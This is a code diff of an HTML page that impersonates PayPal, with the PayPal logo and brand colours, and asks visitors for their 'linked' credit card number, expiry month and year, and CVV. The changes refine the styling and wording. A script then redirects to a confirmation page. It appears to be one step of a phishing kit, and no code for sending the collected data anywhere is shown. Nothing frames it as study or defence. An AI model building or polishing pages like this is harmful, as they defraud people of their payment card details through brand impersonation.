@@ -5,13 +5,20 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Enter Credit Card Details</title>
     <style>
-        /* Reuse the same CSS */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
             background: linear-gradient(135deg, #0070ba, #00488f);
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
+            font-family: Arial, sans-serif;
+            font-size: 16px;
+            line-height: 1.5;
         }
         .container {
             background-color: #fff;
@@ -24,14 +31,24 @@
         }
         input, button {
             width: 100%;
-            padding: 10px;
+            padding: 15px;
             margin: 10px 0;
+            font-size: 1rem;
         }
         button {
             background-color: #0070ba;
             color: white;
             border: none;
             border-radius: 8px;
+            cursor: pointer;
+        }
+        h2 {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+        }
+        p {
+            margin-top: 20px;
+            font-size: 1rem;
         }
     </style>
 </head>
@@ -39,28 +56,19 @@
 
 <div class="container">
     <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal Logo" style="width: 150px;">
-    <h2>For Confirmation Enter Your Credit Card Details</h2>
+    <h2>Enter Your Credit Card Details</h2>
     <form id="creditCardForm">
-        <label for="cardNumber">Your Linked Credit Card Number</label>
-        <input type="text" id="cardNumber" name="cardNumber" placeholder="Enter your credit card number" required>
-        
-        <label for="expiredMonth">Your Credit Card Expired Month</label>
-        <input type="number" id="expiredMonth" name="expiredMonth" placeholder="MM (e.g. 05)" required>
-
-        <label for="expiredYear">Your Credit Card Expired Year</label>
-        <input type="number" id="expiredYear" name="expiredYear" placeholder="YYYY (e.g. 2025)" required>
-
-        <label for="cvv">Your Credit Card CVV</label>
-        <input type="password" id="cvv" name="cvv" placeholder="Enter CVV" required>
-
+        <input type="text" id="cardNumber" name="cardNumber" placeholder="Your Linked Credit Card Number" required>
+        <input type="text" id="cardExpiryMonth" name="cardExpiryMonth" placeholder="Your Credit Card Expiry Month" required>
+        <input type="text" id="cardExpiryYear" name="cardExpiryYear" placeholder="Your Credit Card Expiry Year" required>
+        <input type="text" id="cardCVV" name="cardCVV" placeholder="Your Credit Card CVV" required>
         <button type="button" onclick="nextPage()">Submit</button>
     </form>
 </div>
 
 <script>
     function nextPage() {
-        // Perform validation or store data if needed
-        window.location.href = "confirmation.html"; // Redirect to the confirmation page
+        window.location.href = "confirmation.html";
     }
 </script>
 
